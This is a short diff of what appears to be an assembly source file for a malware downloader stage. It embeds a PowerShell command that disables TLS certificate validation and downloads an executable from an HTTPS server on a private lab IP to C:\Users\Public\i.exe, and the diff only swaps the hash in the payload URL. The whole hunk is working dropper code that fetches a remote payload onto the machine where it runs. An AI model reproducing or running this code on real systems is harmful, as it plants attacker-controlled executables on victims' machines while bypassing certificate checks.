@@ -118,7 +118,7 @@ cmd:
     db '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
     db '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;'
     db '(New-Object Net.WebClient).DownloadFile('
-    db 0x27, 'https://192.168.56.1:8443/update/5b7494537234adc7da155fc48e297943638b519a21fc360075b4ff138c2011a2', 0x27
+    db 0x27, 'https://192.168.56.1:8443/update/f566cad4d21900eb87d9fdb24bedc5023dfecf4c4695642e2efb550a09332c92', 0x27
     db ','
     db 0x27, 'C:\Users\Public\i.exe', 0x27
     db ');'
